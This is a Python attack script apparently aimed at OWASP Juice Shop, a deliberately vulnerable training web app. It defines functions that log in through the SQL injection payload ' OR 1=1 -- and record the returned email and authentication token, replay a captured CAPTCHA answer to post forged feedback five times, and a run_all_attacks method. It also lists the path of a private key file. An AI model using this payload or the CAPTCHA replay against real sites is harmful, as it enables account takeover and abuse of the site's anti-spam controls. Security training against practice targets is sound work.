import requests
import logging


class CaptchaBypass:
    def __init__(self, base_url):
        self.base_url = base_url
        self.endpoints = {
            "feedback": "/api/Feedbacks",
            "captcha": "/rest/captcha/",
            "private_key": "/assets/private-key.pem",
        }

    def get_captcha(self):
        """Retrieve CAPTCHA data."""
        response = requests.get(self.base_url + self.endpoints["captcha"])
        if response.status_code == 200:
            try:
                return response.json()
            except (KeyError, ValueError):
                logging.error("Failed to parse CAPTCHA response.")
        return None
    
    def get_feedbacks(self):
        """Retrieve all feedbacks from the Juice Shop."""
        response = requests.get(self.base_url + self.endpoints["feedback"])
        if response.status_code == 200:
            try:
                feedbacks = response.json()["data"]
                logging.info(f"[+] Retrieved {len(feedbacks)} feedbacks.")
                return {"status": "success", "feedbacks": feedbacks}
            except KeyError:
                logging.error("Failed to parse feedback response.")
                return {"status": "failed", "details": "Invalid feedback data format."}
        else:
            logging.warning("[-] Failed to retrieve feedbacks.")
            return {"status": "failed", "details": response.text}

    def test_sql_injection(self):
        """Perform SQL Injection test."""
        payload = "' OR 1=1 --"
        data = {"email": payload, "password": "password"}

        response = requests.post(self.base_url + "/rest/user/login", json=data)
        if response.status_code == 200:
            try:
                details = response.json()
                email = details.get("email", "Unknown email")
                token = details.get("authentication", {}).get("token", "No token")
                logging.info(f"[+] SQL Injection succeeded. Email: {email}, Token: {token}")
                return {"status": "success", "details": {"email": email, "token": token}}
            except (KeyError, ValueError):
                logging.error("[!] Failed to parse server response during SQL Injection.")
                return {"status": "failed", "details": "Invalid response format."}
        else:
            logging.warning("[-] SQL Injection failed.")
            return {"status": "failed", "details": response.text}

    def test_captcha_bypass(self):
        """Bypass CAPTCHA by reusing valid CAPTCHA data."""
        captcha_data = self.get_captcha()
        if not captcha_data:
            return {"status": "failed", "details": "CAPTCHA retrieval failed."}

        data = {
            "comment": "This is a test bypass",
            "rating": 1,
            "author": "Attacker",
            "captchaId": captcha_data["captchaId"],
            "captcha": captcha_data["answer"],
        }

        results = []
        for i in range(5):
            response = requests.post(self.base_url + self.endpoints["feedback"], json=data)
            if response.status_code == 201:
                try:
                    feedback_id = response.json().get("data", {}).get("id", "Unknown ID")
                    logging.info(f"[+] CAPTCHA Bypass succeeded. Feedback ID: {feedback_id}")
                    results.append({"status": "success", "feedback_id": feedback_id})
                except (KeyError, ValueError):
                    results.append({"status": "success", "details": "Feedback submitted but no ID returned."})
            else:
                logging.warning(f"[-] CAPTCHA Bypass failed on request {i + 1}.")
                results.append({"status": "failed", "details": response.text})

        return {"status": "success" if any(r['status'] == "success" for r in results) else "failed", "details": results}

    def run_all_attacks(self):
        """Run all attacks and return their results."""
        results = {
            "SQL Injection": self.test_sql_injection(),
            "CAPTCHA Bypass": self.test_captcha_bypass(),
        }
        return results
    
    
